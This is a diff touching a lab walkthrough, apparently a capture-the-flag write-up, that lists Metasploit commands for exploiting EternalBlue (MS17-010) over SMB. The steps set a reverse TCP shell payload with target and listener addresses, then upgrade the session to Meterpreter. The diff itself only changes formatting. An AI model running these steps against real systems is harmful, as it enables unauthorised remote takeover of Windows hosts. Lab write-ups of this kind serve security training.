@@ -11,7 +11,7 @@ When you are looking through the output, you see in the `smb-os-discovery` that 
 
 Run metasploit using `msfconsole` and run this command: `use exploit/windows/smb/ms17_010_eternalblue`. You are told to use a different payload instead of the default one, you can change the payload using this: `set payload windows/x64/shell/reverse_tcp`. This payload will directly give you a shell instead of a meterpreter shell. Change the RHOST (the machine you're targetting) using `set RHOSTS IP_ADDR` and your LHOST (if you're not on AttackBox) with the IP you were provided by the VPN using this command: `set LHOST IP_ADDR`
 
-Run the exploit with `run` and you will be given a shell. Background this using Ctrl+Z and then find a post-exploiation module which will give you a meterpreter shell. This will be the `post/multi/manage/shell_to_meterpreter` module. type `use post/multi/manage/shell_to_meterpreter` and check the session number for your background tasks by typing `sessions`. Usually this should be 1 and you run following command `set session NUM`. It should be successful when this output shows:
+Run the exploit with `run` and you will be given a shell. Background this using Ctrl+Z and then find a post-exploiation module which will give you a meterpreter shell. This will be the post/multi/manage/shell_to_meterpreter module. type `use post/multi/manage/shell_to_meterpreter` and check the session number for your background tasks by typing `sessions`. Usually this should be 1 and you run following command `set session NUM`. It should be successful when this output shows:
 
 ![Image](images/2.png)
 
